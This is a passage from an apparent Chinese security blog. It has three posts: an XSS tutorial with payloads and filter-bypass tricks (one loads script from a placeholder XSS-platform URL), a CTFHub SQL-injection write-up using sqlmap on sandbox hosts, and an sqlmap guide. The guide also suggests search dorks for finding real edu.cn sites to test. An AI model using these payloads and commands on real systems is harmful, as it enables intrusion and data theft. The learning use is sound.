class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM-XSS&lt;/title&gt;</span><br><span class="line">&lt;meta&gt;charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/heaf&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a = document.URL;</span><br><span class="line">a = unescape(a);</span><br><span class="line">document.write(a.substring(a.indexOf(&quot;message=&quot;)+8,a.length));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/bofy&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>2.我们通过浏览器访问该网页，因为我们还没有给URL传递参数message，此处将内容以存文本的形式输出。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5a50997dbfd1b77fe59c2e513d4e20af.png" alt="在这里插入图片描述"></p><p>3.修改参数为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>，回车时则出现弹窗。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/545abeca38ac665bd35dc4d4030b8a2f.png" alt="在这里插入图片描述"></p><p>4.我们右键查看源代码，发现代码与刚刚编写的一致，并没有弹窗的内容。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/873507b95133cffa23e7e8c2c7022087.png" alt="在这里插入图片描述"></p><p>5.审查网页元素，则可以看到DOM树这里多出了个弹窗内容，就是上述document语句修改生成的。（有的浏览器查看结果有区别，可以试试不同浏览器的解析结果）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/36c018381f067a48d5a2457d4e30fd07.png" alt="在这里插入图片描述"></p><h2 id="3-XSS语句构造与绕过">3 XSS语句构造与绕过</h2><h4 id="3-1-XSS语句构造方式">3.1 XSS语句构造方式</h4><p>第一种：可以利用[&lt;&gt;]构造HTML/JS语句，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>第二种：可以利用javascript:伪协议的方式构造XSS。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;touch me&lt;/a&gt; //利用a标签的javascript:伪协议</span><br><span class="line">&lt;img src=&quot;javascript:alert(/xss/)&quot; &gt; //利用img标签的javascript:伪协议，但是这种方式在IE6下测试成功，在IE8失败</span><br><span class="line">javascript:$.getScript(&quot;XSS平台接收网址&quot;)   //jQuery 的 $.getScript() 函数用来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</span><br></pre></td></tr></table></figure><p>第三种：事件驱动：事件驱动是一种比较经典的编程思想。在网页内会发生很多事件（比如鼠标移动，键盘输入等），JS可以对此类事件进行响应，因此我们可以通过事件触发JS函数，触发XSS。事件种类主要有以下几种。<br>1.Windows事件：对Windows对象触发的事件；<br>2.Form事件：HTML表单内的动作触发事件；<br>3.keyboard事件：键盘按键；<br>4.Mouse事件：有鼠标或类似用户动作触发的事件；<br>5.Media事件：由多媒体触发的事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;./smile.jpg&#x27; onmouseover=&#x27;alert(/xss/)&#x27;&gt;//该标签会引入一张图片，然后鼠标悬停在图片上的时候，会触发XSS代码。</span><br><span class="line">&lt;img src=&#x27;./smile.jpg&#x27; onerror=&#x27;alert(/xss/)&#x27;&gt;//onerror会在文档载入失败时触发XSS，比如下一个语句</span><br><span class="line">&lt;img src=&#x27;#&#x27; onerror=&#x27;alert(/xss/)&#x27;&gt;//与上一个语句相比，将文件路径改成#，一定载入失败，触发XSS</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(/xss/)&quot;&gt;//单行文本框的键盘点击事件，当点击键盘任一按键时触发XSS。</span><br><span class="line">&lt;input type=&quot;text&quot; onkeyup=&quot;alert(/xss/)&quot;&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; onclick=&quot;alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure><p>第四种：是利用CSS（层叠样式脚本）触发XSS的，该方法比较古老，现已基本不适用于主流浏览器，以下代码均在IE6下进行测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 行内样式</span><br><span class="line"></span><br><span class="line">&lt;div style = &quot;backgroud-image:url(javascript:alert(/xss/))&quot;&gt;</span><br><span class="line">//页内样式</span><br><span class="line">&lt;style&gt;Body&#123;backgroud-image:url(javascript:alert(/xss/))&#125;&lt;/style&gt;</span><br><span class="line">//外部样式</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./xss.css&quot;&gt;&lt;div&gt;hello&lt;div&gt;</span><br><span class="line">//其中xss.css文本内容如下</span><br><span class="line">h1 &#123;color:red;&#125;</span><br><span class="line">div&#123;</span><br><span class="line">/*width:expression(alert(/xss/))*/</span><br><span class="line">backgroud-image:url(javascript:alert(/xss/))</span><br><span class="line">&#125;</span><br><span class="line">@ expression</span><br><span class="line">&lt;div style=&quot;width:expression(alert(/xss/))&quot;&gt;</span><br><span class="line">&lt;style&gt;Body&#123;backgroud-image:expression(alert(/xss/));&#125;&lt;/style&gt;</span><br><span class="line">@import</span><br><span class="line">&lt;style&gt;@import &#x27;javascript:alert(&quot;xss&quot;)&#x27;;&lt;/style&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;@import url(xss.css);&lt;/style&gt;&lt;div&gt;HELLO&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>5.其他标签及手法，利用一些比较新的前端标签进行构造。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;alert(/xss/)&quot;&gt;</span><br><span class="line">&lt;input onfocus=alert(xss/) autofocus&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-变形及绕过方式">3.2 变形及绕过方式</h4><p>0.目的：我们可以将构造的XSS代码进行各种变形，以绕过XSS过滤器检测。<br>第一种：大小写混编<br>可以将payload进行大小写混编，如以下例子。例子中包含两种语言，其中html语言对大小写不敏感，也就是说无论是大小写，该语言都认为是同一个函数；但是JS语言对大小写敏感，比如alert()函数，如果改为Alert()，JS语言则认为是另一个东西。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img Src=&#x27;#&#x27; Onerror=&#x27;alert(/xss/)&#x27;&gt;//由&lt;img src=&#x27;#&#x27; οnerrοr=&#x27;alert(/xss/)&#x27;&gt;变形得到的</span><br><span class="line">&lt;A Href=&quot;javascript:alert(/xss/)&quot;&gt;touch me&lt;/a&gt;//由&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;touch me&lt;/a&gt;变形得到的</span><br></pre></td></tr></table></figure><p>第二种：双写绕过。当发现过滤器仅进行一次过滤时并将一些关键字过滤为空，则可以使用双写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/scr&lt;/script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>第三种：引号的使用<br>HTML语言中对引号的使用不敏感，但是有些过滤函数则对引号时锱铢必较的，因此我们可以使用不同引号来闭合XSS语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//以下三种均可能成功触发XSS，具体能否注入就看过滤是如何过滤的了。</span><br><span class="line">&lt;img src=&quot;#&quot; onerror=&quot;alert(/xss/)&quot;&gt;</span><br><span class="line">&lt;img src=&#x27;#&#x27; onerror=&#x27;alert(/xss/)&#x27;&gt;</span><br><span class="line">&lt;img src=# onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>第四种：使用 [/]或者/**/ 代替空格，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&#x27;#&#x27;/onerror=&#x27;alert(/xss/)&#x27;&gt;</span><br></pre></td></tr></table></figure><p>第五种：在一些关键字内，可以插入回车符与Tab符来绕过关键字检测。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;#&#x27; onerror=&#x27;alert(/xss/)&#x27;&gt;//有时候tab符插在关键字内会失效。</span><br><span class="line">&lt;a href=&quot;ja</span><br><span class="line">vascript:alert(/xss/)&quot;&gt;touch me&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>如果过滤了script，可以使用大小写绕过，如sCRiPt</p><p>第六种：<br>1.编码绕过。可以对标签属性值进行转码，来实现绕过在，转码后的要加分号。<br>字符a，对应ASCII码97，十进制编码&amp;#97，十六进制编码&amp;#x61。<br>字符e，对应ASCII码101，十进制编码&amp;#101，十六进制编码&amp;#x65。<br>2.另外，可以将以下字符插入到任意位置中：<br>Tab ==&gt; &amp;#9<br>换行 ==&gt; &amp;#10<br>回车 ==&gt; &amp;#13<br>3.可以将以下字符插入到头部位置。<br>SOH ==&gt; &amp;#01<br>STX ==&gt; &amp;#01<br>转码后例子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;A href=&quot;j&amp;#97;v&amp;#x61;script:laert(/xss/)&quot;&gt;click me!&lt;/a&gt;//经过简单编码</span><br><span class="line">&lt;A href=&quot;&amp;#01;j&amp;#97;v&amp;#x61;s&amp;#9;c&amp;#10;r&amp;#13;ipt:laert(/xss/)&quot;&gt;click me!&lt;/a&gt;//经过插入字符</span><br></pre></td></tr></table></figure><p>第七种：拆分跨站，将语句才分成多个，拼串起来后再执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&#x27;alert&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;(/xss/)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(z)&lt;/script&gt;//ecal为执行函数，将后续的字符串当成语句执行。</span><br></pre></td></tr></table></figure><p>第八种：CSS中的变形。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">width: ｅｘｐｒｅｓｓｉｏｎ（alert(/xss/)）//使用全角字符</span><br><span class="line">width:expre/**/ssion(alert(/xss/))//注释会被浏览器忽略</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@import &#x27;javas\cri\0pt:alert(/xss/)&#x27;;&lt;/style&gt;//插入 \ 和 \0 符号</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4e70d466a031eaf51d182023d68f3ba3.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e7ce9999bf5100125559bd6a2675bbef.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.10.28</title>
      <link href="/posts/9eb3c9ef.html"/>
      <url>/posts/9eb3c9ef.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h4 id="整数型注入">整数型注入</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028214432589.png" alt="image-20241028214432589"></p><blockquote><p>看到源码了，直接sql一套秒了</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028214411807.png" alt="image-20241028214411807"></p><h4 id="字符型注入">字符型注入</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028214614401.png" alt="image-20241028214614401"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028215453005.png" alt="image-20241028215453005"></p><h4 id="SQL-报错注入">SQL 报错注入</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028215607907.png" alt="image-20241028215607907"></p><blockquote><p>构造payload</p><p>1 and (select extractvalue(1,concat(‘~’,(select database()))))</p><p>后续步骤跟sql基本步骤一样</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028220809635.png" alt="image-20241028220809635"></p><h4 id="SQL-布尔注入">SQL 布尔注入</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029190728233.png" alt="image-20241029190728233"></p><blockquote><p>人工测试太麻烦，这里直接使用sqlmap,知道这有sql注入漏洞，就省去扫描步骤了。</p></blockquote><blockquote><p>先查看当前数据库  --sqli</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://challenge-3fe138f1ff2d9eae.sandbox.ctfhub.com:10800/?id=2&#x27; -batch --current-db</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029190924035.png" alt="image-20241029190924035"></p><blockquote><p>再查看表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://challenge-3fe138f1ff2d9eae.sandbox.ctfhub.com:10800/?id=2&#x27; -batch -D &#x27;sqli&#x27; --tables</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029191400321.png" alt="image-20241029191400321"></p><blockquote><p>查看flag表中的字段</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://challenge-3fe138f1ff2d9eae.sandbox.ctfhub.com:10800/?id=2&#x27; -batch -D &#x27;sqli&#x27; -T &#x27;flag&#x27; --columns</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029192216810.png" alt="image-20241029192216810"></p><blockquote><p>查看flag字段下的内容，找到flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://challenge-3fe138f1ff2d9eae.sandbox.ctfhub.com:10800/?id=2&#x27; -batch -D &#x27;sqli&#x27; -T &#x27;flag&#x27; -C &#x27;flag&#x27; --dump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029193105341.png" alt="image-20241029193105341"></p><h4 id="时间盲注">时间盲注</h4><blockquote><p>sqlmap步骤同上面一样</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029195709025.png" alt="image-20241029195709025"></p><h4 id="MySQL结构">MySQL结构</h4><blockquote><p>步骤一样，只是换了个位置</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029200950786.png" alt="image-20241029200950786"></p><h4 id="Cookie注入">Cookie注入</h4><blockquote><p>就是在cookie处进行sql注入，一般cookie处会有暗示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029201349676.png" alt="image-20241029201349676"></p><blockquote><p>将抓包信息保存在txt文件中，然后在cookie处的id=1处加个*号，即改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1*</span><br></pre></td></tr></table></figure><p>指定cookie查询</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r temp.txt -batch</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029201838886.png" alt="image-20241029201838886"></p><blockquote><p>发现存在cookie注入，然后就是与上述步骤相似</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r temp.txt -batch --dbs</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029202129708.png" alt="image-20241029202129708"></p><h4 id="UA注入">UA注入</h4><blockquote><p>refer注入的特征就是抓包后发现缺少refer头部，然后在refer处进行sql漏洞注入。</p></blockquote><p><strong>注意：直接扫描漏洞需要level 3及以上才会查询文件头(UA,refer等)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xxx.com&#x27; -level 3</span><br></pre></td></tr></table></figure><p>这道题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://challenge-3cf6a5a75d4ca322.sandbox.ctfhub.com:10800/&#x27; -level 3 -batch</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029203326528.png" alt="image-20241029203326528"></p><blockquote><p>发现ua注入，剩下的步骤同上</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">sqlmap -u &#x27;http://challenge-3cf6a5a75d4ca322.sandbox.ctfhub.com:10800/&#x27; -level 3 -batch -D &#x27;sqli&#x27; -T &#x27;vjzangmqpt&#x27; --dump </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029203510461.png" alt="image-20241029203510461"></p><h4 id="Refer注入">Refer注入</h4><blockquote><p>步骤同上</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029205211346.png" alt="image-20241029205211346"></p><p><strong>强调：如果直接检查时间太长，可以抓包放进txt文件，在对应的地方注入然后打个标记，然后用文件扫描。</strong></p><h4 id="过滤空格">过滤空格</h4><blockquote><p><a href="http://xn--tamperspace2comment-9f44a811ion5f687b.py">使用tamper模块space2comment.py</a>，步骤一样</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://challenge-922c2f9d7e288e20.sandbox.ctfhub.com:10800?id=1&#x27; --tamper space2comment.py -batch --dbs</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029215956237.png" alt="image-20241029215956237"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用方法</title>
      <link href="/posts/11f9f536.html"/>
      <url>/posts/11f9f536.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/80d2a4ffaa0cb7d7d1db82770ccdf1cf.png" alt="img"></p><p>SQLmap<br>一、目标<br>1、指定url<br>2、指定文件（批量检测）<br>3、指定数据库/表/字段<br>4、post请求<br>5、cookie注入<br>二、脱库<br>1、获取数据库<br>2、获取表<br>3、获取字段<br>4、获取字段类型<br>5、获取值（数据）<br>6、获取用户<br>7、获取主机名<br>8、搜索库、表、字段。<br>9、正在执行的SQL语句<br>三、WAF绕过<br>三、其他<br>SQLmap是一款「自动化」SQL注入工具，kali自带。路径 /usr/share/sqlmap</p><p>打开终端，输入sqlmap，出现以下界面，就说明SQLmap「可用」。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3323630f970599810ae0f763b683dfe5.png" alt="在这里插入图片描述"></p><p>本篇文章使用本地搭建的SQL-labs靶场作为「演示」目标，其他目标可使用必应搜索以下类型的网站：</p><p>inurl:news.asp?id=site:edu.cn<br>inurl:news.php?id= site:edu.cn<br>inurl:news.aspx?id=site:edu.cn<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f8c3e9690521f33f60d6a89532b65714.png" alt="在这里插入图片描述"></p><p>快速入门；SQLmap（常规）使用步骤</p><p>1、检测「注入点」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’</p><p>2、查看所有「数据库」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --dbs</p><p>3、查看当前使用的数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --current-db</p><p>4、查看「数据表」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ --tables</p><p>5、查看「字段」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ -T ‘users’ --tables</p><p>6、查看「数据」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ -T ‘users’ --dump</p><p>一、目标<br>检测「注入点」前，需要指定需要检测的「对象」。</p><p>1、指定url<br>-u 参数，指定需要检测的url，单/双引号包裹。中间如果有提示，就输入y。</p><p>提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。</p><p>sqlmap -u ‘<a href="http://192.168.31.180/sqli-labs-master/Less-1/?id=1">http://192.168.31.180/sqli-labs-master/Less-1/?id=1</a>’</p><p>扫描完成后，告诉我们存在的注入类型和使用的数据库及版本。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/99db1296c6f1ba11ece43312a58b9a74.png" alt="在这里插入图片描述"></p><p>2、指定文件（批量检测）<br>准备一个「文件」，写上需要检测的多个url，一行一个。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cf3f6fe34fdf02ee2474dffd150824a.png" alt="在这里插入图片描述"></p><p>-m 指定文件，可以「批量扫描」文件中的url。</p><p>sqlmap -m urls.txt<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fdcee37c60c4d1a23dbce8cafdbe8968.png" alt="在这里插入图片描述"></p><p>逐个扫描url，需要确认就按y。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f28535eaea3312dc0f7efc5c9789109a.png" alt="在这里插入图片描述"></p><p>扫描完一个，就会提示存在的注入点。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1e67c982280d436862f49d38a8d33278.png" alt="在这里插入图片描述"></p><p>然后再按y扫描下一个url。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5bd840d90d0fded18745dd251fc46926.png" alt="在这里插入图片描述"></p><p>3、指定数据库/表/字段<br>-D 指定目标「数据库」，单/双引号包裹，常配合其他参数使用。</p><p>-T 指定目标「表」，单/双引号包裹，常配合其他参数使用。</p><p>-C 指定目标「字段」，单/双引号包裹，常配合其他参数使用。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ -T ‘users’ -C ‘username’ --dump</p><p>4、post请求<br>检测「post请求」的注入点，使用BP等工具「抓包」，将http请求内容保存到txt文件中。</p><p>-r 指定需要检测的文件，SQLmap会通过post请求方式检测目标。</p><p>sqlmap -r bp.txt</p><p>5、cookie注入<br>–cookie 指定cookie的值，单/双引号包裹。</p><p>sqlmap -u “<a href="http://xx?id=x">http://xx?id=x</a>” --cookie ‘cookie’</p><p>二、脱库<br>获取所有内容</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -a</p><p>-a 就是 all 的意思，获取所有能获取的内容，会消耗很长时间。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19f8f30a893f664e9ff2cb7ed78c978e.png" alt="在这里插入图片描述"></p><p>1、获取数据库<br>–dbs 获取数据库</p><p>1.1、获取数据库版本</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -b<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/89f970b1e9f84a016b2f69c4b5a057cf.png" alt="在这里插入图片描述"></p><p>最后面显示数据库的版本，这里检测的版本是 5.7.26。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/54199c4a0bf8977e927a146a8a7ab4d7.png" alt="在这里插入图片描述"></p><p>1.2、获取当前使用的数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --current-db<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/743ee0d21d6da89ca35e65e420862827.png" alt="在这里插入图片描述"></p><p>在最后面显示当前使用的数据库的名字是 security。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3363af3cd6ad4b6cd3dfc43b86b08edb.png" alt="在这里插入图片描述"></p><p>1.3、获取所有数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --dbs<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3a12f1219213ff35ff08b280c9c891f1.png" alt="在这里插入图片描述"></p><p>最后面显示所有数据库的名字。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c3ec183bd1f5e0d5dcba921e5730c0a5.png" alt="在这里插入图片描述"></p><p>2、获取表<br>–tables 获取表</p><p>2.1、获取表，可以指定数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ --tables<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/166b14fd037781f3ed47475c67d63e51.png" alt="在这里插入图片描述"></p><p>最后面显示数据库（security）里所有的表名。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b4da6acd6de9525699a41b9d7c7b6529.png" alt="在这里插入图片描述"></p><p>2.2、同时获取多个库的表名，库名用逗号分隔。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security,sys’ --tables<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d3e39fbc0417cc7070d7758475e8ecbe.png" alt="在这里插入图片描述"></p><p>2.3、不指定数据库，默认获取数据库中所有的表。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --tables<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/41753aed6ee25a50025b643d165fd311.png" alt="在这里插入图片描述"></p><p>最后面显示每个数据库下都有哪些表。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c9b8732f73e248eb0b9cb9c863c71722.png" alt="在这里插入图片描述"></p><p>3、获取字段<br>–columns 参数用来获取字段。</p><p>3.1、获取字段，可以指定库和表</p><p>提示：只指定库名但不指定表名会报错。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ -T ‘users’ --columns<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/47c49038c40755474475ba8ddf6d9aef.png" alt="在这里插入图片描述"></p><p>最后面显示表（users）中的所有字段。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2ab76f10298b7b9b59c06379adb67f8a.png" alt="在这里插入图片描述"></p><p>3.2、不指定表名，默认获取当前数据库中所有表的字段。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ --columns<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/684209317b809b4a82b77b7872a7034c.png" alt="在这里插入图片描述"></p><p>4、获取字段类型<br>–schema 获取字段类型，可以指定库或指定表。不指定则获取数据库中所有字段的类型。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ --schema</p><p>最后面显示每个表的字段类型。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b1965bfe6007dc83c0440bef8cd8ae10.png" alt=""></p><p>5、获取值（数据）<br>–dump 获取值，也就是表中的数据。可以指定具体的库、表、字段。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>’ -D ‘security’ -T ‘users’ -C ‘username,password’ 